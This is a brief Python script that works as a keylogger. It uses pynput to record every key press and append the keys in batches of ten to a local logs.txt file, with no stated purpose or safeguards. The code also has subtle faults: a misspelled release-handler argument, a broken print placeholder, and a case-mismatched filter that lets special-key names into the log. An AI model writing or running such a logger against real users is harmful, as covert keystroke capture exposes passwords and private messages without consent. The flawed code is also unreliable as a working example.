import pynput


from pynput.keyboard import Key, Listener

def write_file(keys):
	with open ("logs.txt", "a") as f:
		for key in keys:
			k= str(key).replace("'","")
			if (k.find("space") > 0):
				f.write('\n')
			elif (k.find("key") == -1):
				f.write(k)

count = 0
keys = []
def on_press(key):
	global keys, count

	print("[0] pressed".format(key))

	keys.append(key)
	count+=1

	if (count >= 10):
		count = 0
		write_file(keys)
		keys = []


def on_realse(key):
	if key == Key.esc:
		return False


with Listener(on_press = on_press, on_realse = on_realse) as listener:
	listener.join()




